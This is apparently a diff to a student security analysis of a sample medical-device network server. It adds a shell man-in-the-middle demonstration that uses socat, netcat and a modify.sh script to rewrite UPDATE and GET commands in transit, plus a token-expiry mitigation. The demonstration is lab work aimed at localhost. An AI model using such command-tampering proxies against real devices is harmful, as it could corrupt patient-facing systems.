@@ -39,7 +39,7 @@ sleep 3 #allot time for termination of above processes
 
 python3 SampleNetworkServer.py & #start server in the background
 sleep 1
-socat -u tcp-l:5557,fork system:./test.sh | nc -u 127.0.0.1 23456 & #start socat with script that rewrites commands; modified commands are piped to port 23456
+socat -u tcp-l:5557,fork system:./modify.sh | nc -u 127.0.0.1 23456 & #start socat with script that rewrites commands; modified commands are piped to port 23456
 sleep 1
 token="$(echo "AUTH !Q#E%T&U8i6y4r2w" | nc -w 3 -u 127.0.0.1 23456)" #terminate netcat after three seconds
 echo "the token: ${token}"
@@ -48,6 +48,22 @@ echo "issuing UPDATE_TEMP command to server..."
 UPDATE_CMD="${token};UPDATE_TEMP"
 echo "full command: ${UPDATE_CMD}"
 echo "${UPDATE_CMD}" | nc -w 3 127.0.0.1 5557
+```
+**modify.sh**
+```
+#!/bin/bash
+read MESSAGE
+if grep -q "UPDATE" <<< "$MESSAGE"
+then
+	var=$(echo "$MESSAGE" | awk '{ sub(/UPDATE/,"GET"); print }')
+	echo $var
+elif grep -q "GET" <<< "$MESSAGE"
+then
+	var=$(echo "$MESSAGE" | awk '{ sub(/GET/,"UDPATE"); print }')
+	echo $var
+else
+	echo $MESSAGE
+fi
 ```
 
 The success of the attack rests on commands being transmitted in plaintext and the absence of a mechanism to verify that the intended command was not modified in-transit.
@@ -86,3 +102,5 @@ done
 ## Session Expiry
 
 Unless the SampleNetworkServer is restarted, all previously issued access tokens are valid until the user explicitly invalidates them by issuing the LOGOUT command along with their access token(s). However, a nurse may forget or refuse to log out of the system at the conclusion of their shift. This results in a lack of forward secrecy as an attacker who has learned of a token from _X_ days/months/years ago may leverage it indefinitely.
+
+One approach to mitigate this issue is to perform a server-side check of a token submitted alongside a command to ascertain that the difference between CURRENT_TIME and TIME is less than or equal to the MAX_AGE (defined by the system designer). If this statement evaluates to true, the token in question is removed from self.tokens[] and the user is prompted to re-authenticate.
